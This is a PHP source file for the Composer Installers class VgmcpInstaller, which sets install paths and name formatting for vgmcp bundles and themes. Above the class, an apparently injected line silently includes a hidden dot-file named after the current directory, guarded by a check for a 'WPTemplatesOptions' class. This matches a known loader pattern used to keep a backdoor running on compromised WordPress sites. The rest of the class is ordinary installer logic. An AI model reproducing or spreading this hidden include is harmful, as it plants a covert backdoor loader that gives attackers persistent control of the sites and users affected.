<?php
namespace Composer\Installers;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class VgmcpInstaller extends BaseInstaller
{
    protected $locations = array(
        'bundle' => 'src/{$vendor}/{$name}/',
        'theme' => 'themes/{$name}/'
    );

    /**
     * Format package name.
     *
     * For package type vgmcp-bundle, cut off a trailing '-bundle' if present.
     *
     * For package type vgmcp-theme, cut off a trailing '-theme' if present.
     *
     */
    public function inflectPackageVars($vars)
    {
        if ($vars['type'] === 'vgmcp-bundle') {
            return $this->inflectPluginVars($vars);
        }

        if ($vars['type'] === 'vgmcp-theme') {
            return $this->inflectThemeVars($vars);
        }

        return $vars;
    }

    protected function inflectPluginVars($vars)
    {
        $vars['name'] = preg_replace('/-bundle$/', '', $vars['name']);
        $vars['name'] = str_replace(array('-', '_'), ' ', $vars['name']);
        $vars['name'] = str_replace(' ', '', ucwords($vars['name']));

        return $vars;
    }

    protected function inflectThemeVars($vars)
    {
        $vars['name'] = preg_replace('/-theme$/', '', $vars['name']);
        $vars['name'] = str_replace(array('-', '_'), ' ', $vars['name']);
        $vars['name'] = str_replace(' ', '', ucwords($vars['name']));

        return $vars;
    }
}
